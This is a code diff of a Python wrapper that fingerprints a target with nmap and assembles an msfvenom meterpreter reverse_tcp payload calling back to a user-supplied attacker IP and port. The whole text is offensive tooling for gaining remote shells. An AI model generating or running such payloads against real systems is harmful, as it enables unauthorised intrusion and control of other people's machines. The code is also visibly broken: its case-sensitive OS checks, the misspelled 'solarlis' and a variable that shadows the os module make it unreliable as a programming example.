@@ -24,7 +24,7 @@ def msfvenomWrapper():
 msfvenomWrapper()
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------
-IF I CAN GET THIS ONE TO WORK, THIS MIGHT BE A GOOD ONE
+THIS SHOULD BE A BETTER ONE
 #!/usr/bin/python
 
 import os
@@ -38,18 +38,20 @@ attackerPort = input("Please enter the port of the attacker machine: ")
 
 # Enumerate target
 targetIP = input("Please enter the IP of the target machine: ")
-osInfo = subprocess.check_output(["nmap", "-O", targetIP])
+osInfo = str(subprocess.check_output(["nmap", "-O", targetIP]))
+print(type(osInfo))
+print(osInfo)
 
-# Parse OS info 
-if "Linux" in osInfo:
-    os = "linux"
-elif "Windows" in osInfo:
+if osInfo.find("windows") != -1:
+    #print("i found windows")
     os = "windows"
-elif "Solaris" in osInfo:
+    print(os)
+elif osInfo.find("linux") != -1:
+    os = "linux"
+    print(os)
+elif osInfo.find("solarlis") !=-1:
     os = "solaris"
+    print(os)
 
-# Generate payload
-payload = "msfvenom -p "+os+"/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f raw"
-
-# Execute msfvenom
-os.system(payload)
+payload = "msfvenom -p "+os+"/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f raw"      
+print(payload)
